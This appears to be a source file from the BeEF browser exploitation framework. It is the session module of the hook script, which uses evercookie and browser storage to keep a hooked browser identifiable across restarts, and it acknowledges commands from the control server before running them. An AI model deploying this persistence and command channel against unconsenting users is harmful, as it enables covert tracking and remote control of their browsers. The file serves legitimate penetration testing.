//
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Provides basic session functions.
 * @namespace beef.session
 */
beef.session = {

	hook_session_id_length: 64,
	hook_session_id_chars: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
	ec: new evercookie(),
    beefhook: "<%= @hook_session_name %>",

	// Opt-in stable session management, rendered server-side from config.yaml.
	// When false the legacy evercookie-only behaviour below is preserved exactly.
	stable_sessions_enabled: <%= @session_management_enable %>,
	tab_scope: "<%= @session_tab_scope %>",
	ack_handler: "<%= @ack_handler %>",

	// localStorage key holding the browser-persisted identity. Survives a control
	// plane restart because the value lives in the browser, not server memory.
	persistent_key: "beef.persistent_id",
	tab_key: "beef.tab_id",

	/**
	 * Cryptographically strong random byte when the platform supports it;
	 * otherwise fall back to Math.random so legacy/old browsers still hook.
	 */
	secure_random_byte: function() {
		if (window.crypto && window.crypto.getRandomValues) {
			var buf = new Uint8Array(1);
			window.crypto.getRandomValues(buf);
			return buf[0];
		}
		return Math.floor(Math.random() * 256);
	},
	
	/**
	 * Gets a string which will be used to identify the hooked browser session
	 * 
	 * @example: var hook_session_id = beef.session.get_hook_session_id();
	 */
  	get_hook_session_id: function() {
		if (this.stable_sessions_enabled) {
			return this.get_stable_session_id();
		}

		// check if the browser is already known to the framework
		var id = this.ec.evercookie_cookie(beef.session.beefhook);
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_userdata(beef.session.beefhook);
		}
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_window(beef.session.beefhook);
		}
		
		// if the browser is not known create a hook session id and set it
		if ((typeof id == 'undefined') || (id == null)) {
			id = this.gen_hook_session_id();
			this.set_hook_session_id(id);
		}
		
		// return the hooked browser session identifier
		return id;
	},

	/**
	 * Stable identity resolution.
	 *
	 * tab_scope "browser" (default): every tab in this browser shares one id via
	 * localStorage, so a command targets the whole browser and can never land on
	 * "the other tab". tab_scope "tab": each tab keeps its own id via sessionStorage.
	 */
	get_stable_session_id: function() {
		var store = this.tab_scope === "tab" ? window.sessionStorage : window.localStorage;
		var key = this.tab_scope === "tab" ? this.tab_key : this.beefhook;

		var id = null;
		try { id = store.getItem(key); } catch (e) { id = null; }

		// Mirror to/from the classic evercookie stores so older server-side flows and
		// browsers without storage support keep working.
		if (!id) {
			id = this.ec.evercookie_cookie(this.beefhook);
		}

		if (!id) {
			id = this.gen_hook_session_id();
			this.set_hook_session_id(id);
		} else {
			// re-assert persistence on every load (cookies can expire, storage rarely does)
			this.set_hook_session_id(id);
		}
		return id;
	},

	/**
	 * Browser-persisted identifier sent on /init so the server can reattach a
	 * reconnecting browser to its original session after a control-plane restart.
	 */
	get_persistent_id: function() {
		try {
			var pid = window.localStorage.getItem(this.persistent_key);
			if (!pid) {
				pid = this.gen_hook_session_id();
				window.localStorage.setItem(this.persistent_key, pid);
			}
			return pid;
		} catch (e) {
			return this.get_hook_session_id();
		}
	},
	
	/**
	 * Sets a string which will be used to identify the hooked browser session
	 * 
	 * @example: beef.session.set_hook_session_id('RANDOMSTRING');
	 */
  	set_hook_session_id: function(id) {
		if (this.stable_sessions_enabled) {
			try {
				var store = this.tab_scope === "tab" ? window.sessionStorage : window.localStorage;
				var key = this.tab_scope === "tab" ? this.tab_key : this.beefhook;
				store.setItem(key, id);
				window.localStorage.setItem(this.persistent_key, this.get_persistent_id() || id);
			} catch (e) {
				// storage blocked (private mode): evercookie below still carries the id.
			}
		}
		// persist the hook session id
		this.ec.evercookie_cookie(beef.session.beefhook, id);
		this.ec.evercookie_userdata(beef.session.beefhook, id);
		this.ec.evercookie_window(beef.session.beefhook, id);
	},
	
	/**
	 * Generates a random string using the chars in hook_session_id_chars.
	 * 
	 * @example: beef.session.gen_hook_session_id();
	 */
  	gen_hook_session_id: function() {
		if (this.stable_sessions_enabled) {
			// 32 random bytes -> 64 hex chars, unguessable and free of internal structure.
			var hex = "";
			for (var i = 0; i < this.hook_session_id_length / 2; i++) {
				var b = this.secure_random_byte();
				hex += ("0" + b.toString(16)).slice(-2);
			}
			return hex;
		}

	    // init the return value
		var hook_session_id = "";
		
		// construct the random string 
		for(var i=0; i<this.hook_session_id_length; i++) {
		  var rand_num = Math.floor(Math.random()*this.hook_session_id_chars.length);
		  hook_session_id += this.hook_session_id_chars.charAt(rand_num);
		}
		
		return hook_session_id;
	},

	/**
	 * Acknowledge receipt of an instruction before executing it. Uses the existing
	 * beef.net transport (XHR queue or websocket) against the mounted /ack handler.
	 */
	ack: function(cid) {
		try {
			if (typeof beef.websocket !== "undefined" && beef.websocket.socket &&
				beef.websocket.socket.readyState === 1) {
				beef.websocket.send('{"handler":"' + this.ack_handler + '","cid":' +
					parseInt(cid, 10) + ',"bh":"' + this.get_hook_session_id() + '"}');
			} else {
				beef.net.send(this.ack_handler, parseInt(cid, 10), {"ack": true});
			}
		} catch (e) {
			beef.debug("beef.session.ack failed: " + e.message);
		}
	}
};

beef.regCmp('beef.session');
